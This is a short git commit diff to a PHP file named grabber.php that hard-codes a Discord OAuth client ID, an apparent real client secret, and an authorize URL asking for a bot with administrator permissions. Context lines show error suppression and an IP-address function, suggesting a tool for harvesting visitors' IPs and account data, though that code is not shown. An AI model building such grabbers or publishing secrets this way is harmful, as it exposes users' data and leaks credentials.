a92af026e91e577a73cdf077ada478392049983b
mario283w <142307243+mario283w@users.noreply.github.com>
2023-09-03 21:26:22 +0100

    Update grabber.php

--- grabber.php
+++ grabber.php
@@ -2,9 +2,9 @@
 ob_start();
 error_reporting(0);
 
-$client_id     = ""; //CLIENT ID HERE
-$client_secret = ""; //CLIENT SECRET HERE
-$redirect      = ""; //PATH TO THIS FILE (SAME AS THE ONE YOU SET IN DISCORDAPP.COM/DEVELOPERS)
+$client_id     = "1147988185499058226"; //CLIENT ID HERE
+$client_secret = "vOVMWCZykfeF7pKSKfj9wFUHjTLVkYNu"; //CLIENT SECRET HERE
+$redirect      = "https://discord.com/oauth2/authorize?client_id=1147988185499058226&scope=bot&permissions=8"; //PATH TO THIS FILE (SAME AS THE ONE YOU SET IN DISCORDAPP.COM/DEVELOPERS)
 
 function get_ip_address()
 {
